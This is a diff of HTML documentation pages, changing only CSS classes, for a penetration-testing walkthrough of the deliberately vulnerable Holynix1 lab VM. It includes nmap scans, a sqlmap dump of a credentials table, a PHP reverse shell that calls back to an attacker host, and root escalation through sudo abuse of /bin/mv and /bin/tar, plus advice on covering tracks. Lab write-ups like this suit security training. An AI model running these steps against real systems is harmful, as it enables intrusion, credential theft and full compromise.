@@ -235,9 +235,9 @@
 <div>Holynix1 is an ubuntu server vmware image that was deliberately built to have security holes for the purposes of penetration testing. More of an obstacle course than a real world example. The object of the challenge is to gain root level privileges and access to personal client information.</div></blockquote>
 <div class="section" id="setting-up-the-vmware-vm">
 <h3>3.17.1.1. Setting up the VMware VM<a class="headerlink" href="#setting-up-the-vmware-vm" title="Permalink to this headline">¶</a></h3>
-<p>The VM comes packaged as <a class="reference external" href="http://download.vulnhub.com/holynix/holynix-v1.tar.bz2">holynix-v1.tar.bz2</a>, which is a tar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of <code class="file docutils literal"><span class="pre">/etc/shadow</span></code>, and delete the root password hash. This will provide passwordless access to holynix1 via root.</p>
+<p>The VM comes packaged as <a class="reference external" href="http://download.vulnhub.com/holynix/holynix-v1.tar.bz2">holynix-v1.tar.bz2</a>, which is a tar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of <code class="file docutils literal notranslate"><span class="pre">/etc/shadow</span></code>, and delete the root password hash. This will provide passwordless access to holynix1 via root.</p>
 <p>See <a class="reference internal" href="VWADP.html#vmsetup"><span class="std std-ref">Traditional VM challenge setup</span></a> for background on using the VMware vmdk file. Holynix1 is Ubuntu 8.04, x86, and 512MB memory.  Here’s how you can create a backing store to undo any changes to the disk:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
 <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
 <span class="nv">VM</span><span class="o">=</span>holynix1
 <span class="nv">BACKING</span><span class="o">=</span><span class="nv">$VM</span>.vmdk
@@ -253,7 +253,7 @@ tar xvfj holynix-v1.tar.bz2
 </pre></div>
 </div>
 <p>Then Linux KVM could use the VM_DISK to create the holynix1 VM. The actual command the author used in Debian Linux to create the VM was:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span>holynix1
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span>holynix1
 <span class="nv">$SUDO</span> virt-install <span class="se">\</span>
     --name <span class="s2">&quot;</span><span class="nv">$VM</span><span class="s2">&quot;</span> --cpu host --vcpus <span class="m">1</span> --ram <span class="m">512</span> <span class="se">\</span>
     --os-type<span class="o">=</span>linux --os-variant<span class="o">=</span>ubuntuhardy <span class="se">\</span>
@@ -276,7 +276,7 @@ tar xvfj holynix-v1.tar.bz2
 </pre></div>
 </div>
 <p>So if holynix1 were running and you wanted to “start over again”:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> virsh shutdown <span class="nv">$VM</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> virsh shutdown <span class="nv">$VM</span>
 <span class="nv">$SUDO</span> virsh undefine <span class="nv">$VM</span>
 <span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="nv">$BACKING</span>  <span class="nv">$VM_DISK</span>
 <span class="nv">$SUDO</span> virt-install <span class="se">\</span>
@@ -295,7 +295,7 @@ tar xvfj holynix-v1.tar.bz2
 <div class="section" id="directory-setup">
 <h3>3.17.2.1. Directory setup<a class="headerlink" href="#directory-setup" title="Permalink to this headline">¶</a></h3>
 <p>We’ll refer to the following directories below:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">BASE</span><span class="o">=</span><span class="nv">$HOME</span>/local/pentest
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">BASE</span><span class="o">=</span><span class="nv">$HOME</span>/local/pentest
 <span class="nv">LOCATION</span><span class="o">=</span><span class="nv">$BASE</span>/phouse
 <span class="nv">JOB</span><span class="o">=</span><span class="nv">$LOCATION</span>/holynix1
 <span class="nv">TOOLS</span><span class="o">=</span>exploit,nmap,sqlmap
@@ -306,7 +306,7 @@ tar xvfj holynix-v1.tar.bz2
 <div class="section" id="basic-network-reconnaisance">
 <h3>3.17.2.2. Basic network reconnaisance<a class="headerlink" href="#basic-network-reconnaisance" title="Permalink to this headline">¶</a></h3>
 <p>Start with some standard network reconnaisance looking for the vulnerable host:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
 <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
 <span class="nb">cd</span> <span class="nv">$JOB</span>/nmap
 <span class="nv">NMOUT</span><span class="o">=</span>nmap
@@ -321,7 +321,7 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 </pre></div>
 </div>
 <p>Running this gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ BASE=$</span>HOME/local/pentest
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ BASE=$</span>HOME/local/pentest
 <span class="gp">hacker@kali:~$ LOCATION=$</span>BASE/phouse
 <span class="gp">hacker@kali:~$ JOB=$</span>LOCATION/holynix1
 <span class="gp">hacker@kali:~$</span> <span class="nv">TOOLS</span><span class="o">=</span>exploit,nmap,sqlmap
@@ -346,13 +346,13 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 </pre></div>
 </div>
 <p>At this point we have $TARGETS so scan them:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">0</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">0</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
 <span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.*
 xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.html
 </pre></div>
 </div>
 <p>Running this gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/nmap$ $</span>SUDO nmap -A -vv -T3 --max-retries <span class="m">0</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/nmap$ $</span>SUDO nmap -A -vv -T3 --max-retries <span class="m">0</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
 </span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 <span class="go">Discovered open port 80/tcp on 192.168.1.105</span>
 <span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
@@ -372,7 +372,7 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 </div>
 <div class="section" id="what-s-at-port-80">
 <h3>3.17.2.3. What’s at port 80?<a class="headerlink" href="#what-s-at-port-80" title="Permalink to this headline">¶</a></h3>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.105
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.105
 <span class="nb">cd</span> <span class="nv">$JOB</span>/exploit
 <span class="c1"># The main page shows a link to a login page</span>
 curl --silent http://<span class="nv">$T</span>/ <span class="p">|</span> grep login
@@ -381,7 +381,7 @@ curl --silent http://<span class="nv">$T</span>/?page<span class="o">=</span>log
 </pre></div>
 </div>
 <p>Running this we see:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/nmap$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.105
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/nmap$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.105
 <span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/nmap$ cd $</span>JOB/exploit
 <span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/exploit$ #</span> The main page shows a link to a login page
 <span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/exploit$</span> curl --silent http://<span class="nv">$T</span>/ <span class="p">|</span> grep login
@@ -400,14 +400,14 @@ curl --silent http://<span class="nv">$T</span>/?page<span class="o">=</span>log
 </div>
 <div class="section" id="sqlmap-to-get-creds">
 <h3>3.17.2.4. <strong class="program">sqlmap</strong> to get creds<a class="headerlink" href="#sqlmap-to-get-creds" title="Permalink to this headline">¶</a></h3>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/sqlmap
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/sqlmap
 <span class="nv">URL</span><span class="o">=</span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/?page=login.php&quot;</span>
 sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --batch <span class="se">\</span>
        --forms --dbs <span class="se">\</span>
        --output-dir <span class="nv">$PWD</span>/sqlmap_login
 </pre></div>
 </div>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/sqlmap$ cd $</span>JOB/sqlmap
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/sqlmap$ cd $</span>JOB/sqlmap
 </span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/sqlmap$ URL=&quot;http://$</span>T/?page<span class="o">=</span>login.php<span class="s2">&quot;</span>
 </span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/sqlmap$</span><span class="s2"> sqlmap -u &quot;</span><span class="nv">$URL</span><span class="s2">&quot; --random-agent --batch \</span>
 </span><span class="hll"><span class="s2">&gt;        --forms --dbs \</span>
@@ -452,7 +452,7 @@ sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class=
 </pre></div>
 </div>
 <p>Pursuing the creds database we find the accounts table:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --batch <span class="se">\</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --batch <span class="se">\</span>
        --forms --dbs --dbms<span class="o">=</span>MySQL -D creds --tables <span class="se">\</span>
        --output-dir <span class="nv">$PWD</span>/sqlmap_login
 </pre></div>
@@ -480,7 +480,7 @@ sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class=
 </tbody>
 </table>
 <p>And looking at the accounts table:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">sqlmap -u &quot;$URL&quot; --random-agent --batch \</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sqlmap -u &quot;$URL&quot; --random-agent --batch \</span>
 <span class="go">       --forms --dbs --dbms=MySQL -D creds -T accounts --dump \</span>
 <span class="go">       --output-dir $PWD/sqlmap_login</span>
 </pre></div>
@@ -563,8 +563,8 @@ sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class=
 <h2>3.17.3. The Exploit<a class="headerlink" href="#the-exploit" title="Permalink to this headline">¶</a></h2>
 <div class="section" id="what-can-we-do-with-credentials">
 <h3>3.17.3.1. What can we do with credentials?<a class="headerlink" href="#what-can-we-do-with-credentials" title="Permalink to this headline">¶</a></h3>
-<p>At this point we can explore the server choosing a user with upload rights: rtmorris with password “<a class="reference external" href="mailto:Myd&#37;&#52;&#48;d51N7h3NSA">Myd<span>&#64;</span>d51N7h3NSA</a>”. It doesn’t take long to notice a form to upload files to the home directory. Here we show the <code class="docutils literal"><span class="pre">curl</span></code> equivalent to logging on and looking at the upload form.</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.105
+<p>At this point we can explore the server choosing a user with upload rights: rtmorris with password “<a class="reference external" href="mailto:Myd&#37;&#52;&#48;d51N7h3NSA">Myd<span>&#64;</span>d51N7h3NSA</a>”. It doesn’t take long to notice a form to upload files to the home directory. Here we show the <code class="docutils literal notranslate"><span class="pre">curl</span></code> equivalent to logging on and looking at the upload form.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.105
 </span><span class="hll"><span class="nb">cd</span> <span class="nv">$JOB</span>/exploit
 </span><span class="hll"><span class="c1"># Login using curl</span>
 </span><span class="hll"><span class="nv">COOKIES</span><span class="o">=</span>cookies.txt
@@ -584,7 +584,7 @@ sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class=
 </span></pre></div>
 </div>
 <p>Running the above gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/exploit$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.105
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/exploit$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.105
 <span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/exploit$ cd $</span>JOB/exploit
 <span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/exploit$ #</span> Login using curl
 <span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/exploit$</span> <span class="nv">COOKIES</span><span class="o">=</span>cookies.txt
@@ -614,7 +614,7 @@ sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class=
 <div class="section" id="upload-a-php-reverse-shell">
 <h3>3.17.3.2. Upload a PHP reverse shell<a class="headerlink" href="#upload-a-php-reverse-shell" title="Permalink to this headline">¶</a></h3>
 <p>Using the upload form, run the following to upload a PHP reverse shell. Note that a straight upload (without taking advantage of gzip) won’t have the right privs to execute, so you must upload a gzip’ed file:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.28
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.28
 </span><span class="hll"><span class="c1"># Upload a php reverse shell</span>
 </span><span class="nv">RSHELL</span><span class="o">=</span><span class="k">$(</span>locate php <span class="p">|</span> grep reverse <span class="p">|</span> tail --lines<span class="o">=</span><span class="m">1</span><span class="k">)</span>
 <span class="nv">UPLOAD</span><span class="o">=</span>rshell.php
@@ -634,7 +634,7 @@ tar -cvzf <span class="nv">$UPLOADTGZ</span> <span class="nv">$UPLOAD</span>
 </span></pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/exploit$</span> <span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.28
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/exploit$</span> <span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.28
 </span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/exploit$ #</span> Upload a php reverse shell
 </span><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/exploit$ RSHELL=$</span><span class="o">(</span>locate php <span class="p">|</span> grep reverse <span class="p">|</span> tail --lines<span class="o">=</span><span class="m">1</span><span class="o">)</span>
 <span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/exploit$</span> <span class="nv">UPLOAD</span><span class="o">=</span>rshell.php
@@ -659,15 +659,15 @@ tar -cvzf <span class="nv">$UPLOADTGZ</span> <span class="nv">$UPLOAD</span>
 <div class="section" id="get-root-via-the-reverse-shell">
 <h3>3.17.3.3. Get root via the reverse shell<a class="headerlink" href="#get-root-via-the-reverse-shell" title="Permalink to this headline">¶</a></h3>
 <p>In a different window on your attacking host run:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll">socat - tcp-listen:9999
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">socat - tcp-listen:9999
 </span></pre></div>
 </div>
 <p>Return to the window you’ve been doing your exploits from to trigger the shell by running:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll">curl --silent --cookie <span class="nv">$COOKIES</span> http://<span class="nv">$T</span>/~<span class="nv">$USER_NAME</span>/<span class="nv">$UPLOAD</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">curl --silent --cookie <span class="nv">$COOKIES</span> http://<span class="nv">$T</span>/~<span class="nv">$USER_NAME</span>/<span class="nv">$UPLOAD</span>
 </span></pre></div>
 </div>
-<p>This will kick off the reverse shell in the <code class="docutils literal"><span class="pre">socat</span></code> window from user www-data without a tty. First get a tty (not required but good practice) and see if we have any <code class="docutils literal"><span class="pre">sudo</span></code> karma:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/exploit$</span> socat - tcp-listen:9999
+<p>This will kick off the reverse shell in the <code class="docutils literal notranslate"><span class="pre">socat</span></code> window from user www-data without a tty. First get a tty (not required but good practice) and see if we have any <code class="docutils literal notranslate"><span class="pre">sudo</span></code> karma:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/holynix1/exploit$</span> socat - tcp-listen:9999
 </span><span class="go">Linux holynix 2.6.24-26-server #1 SMP Tue Dec 1 19:19:20 UTC 2009 i686 GNU/Linux</span>
 <span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 <span class="hll"><span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
@@ -682,8 +682,8 @@ tar -cvzf <span class="nv">$UPLOADTGZ</span> <span class="nv">$UPLOAD</span>
 </span><span class="hll"><span class="go">    (root) NOPASSWD: /bin/mv</span>
 </span></pre></div>
 </div>
-<p>Here’s the key thing: <code class="docutils literal"><span class="pre">chown</span></code>, <code class="docutils literal"><span class="pre">chgrp</span></code>, and <code class="docutils literal"><span class="pre">mv</span></code> rights allow you to replace system executables. Here <code class="docutils literal"><span class="pre">tar</span></code> isn’t needed so you can replace it with <code class="docutils literal"><span class="pre">bash</span></code> and <code class="file docutils literal"><span class="pre">/etc/sudoers</span></code> lets www-data <code class="docutils literal"><span class="pre">sudo</span> <span class="pre">/bin/tar</span></code> without a password:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">www-data@holynix:/$</span> cp /bin/bash /tmp
+<p>Here’s the key thing: <code class="docutils literal notranslate"><span class="pre">chown</span></code>, <code class="docutils literal notranslate"><span class="pre">chgrp</span></code>, and <code class="docutils literal notranslate"><span class="pre">mv</span></code> rights allow you to replace system executables. Here <code class="docutils literal notranslate"><span class="pre">tar</span></code> isn’t needed so you can replace it with <code class="docutils literal notranslate"><span class="pre">bash</span></code> and <code class="file docutils literal notranslate"><span class="pre">/etc/sudoers</span></code> lets www-data <code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">/bin/tar</span></code> without a password:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">www-data@holynix:/$</span> cp /bin/bash /tmp
 </span><span class="go">cp /bin/bash /tmp</span>
 <span class="hll"><span class="gp">www-data@holynix:/$</span> sudo /bin/chown root.root /tmp/bash
 </span><span class="go">sudo /bin/chown root.root /tmp/bash</span>
@@ -698,13 +698,13 @@ tar -cvzf <span class="nv">$UPLOADTGZ</span> <span class="nv">$UPLOAD</span>
 </span><span class="hll"><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
 </span></pre></div>
 </div>
-<p>And we have root and can cover much of our tracks by deleting <code class="file docutils literal"><span class="pre">rshell.php</span></code> and <code class="docutils literal"><span class="pre">mv</span> <span class="pre">/bin/tar.orig</span> <span class="pre">/bin/tar</span></code>.</p>
+<p>And we have root and can cover much of our tracks by deleting <code class="file docutils literal notranslate"><span class="pre">rshell.php</span></code> and <code class="docutils literal notranslate"><span class="pre">mv</span> <span class="pre">/bin/tar.orig</span> <span class="pre">/bin/tar</span></code>.</p>
 <p>A good writeup showing this approach can be found at <a class="reference external" href="http://blog.techorganic.com/2012/04/07/holynix-hacking-challenge-part-1/">Holynix Hacking Challenge: Part 1</a>.</p>
 </div>
 <div class="section" id="get-root-via-other-ways">
 <h3>3.17.3.4. Get root via other ways<a class="headerlink" href="#get-root-via-other-ways" title="Permalink to this headline">¶</a></h3>
-<p>Another approach is to temporarily update <code class="file docutils literal"><span class="pre">/etc/sudoers</span></code> allowing www-data unlimited sudo rights. Picking up from just getting a shell:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<p>Another approach is to temporarily update <code class="file docutils literal notranslate"><span class="pre">/etc/sudoers</span></code> allowing www-data unlimited sudo rights. Picking up from just getting a shell:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
 sudo /bin/tar -cvpPf /tmp/sudoers.tar /etc/sudoers
 <span class="nb">echo</span> <span class="s2">&quot;root ALL=(ALL) ALL&quot;</span> &gt; /tmp/sudoers
 <span class="nb">echo</span> <span class="s2">&quot;%www-data ALL=(ALL) NOPASSWD: ALL&quot;</span> &gt;&gt; /tmp/sudoers
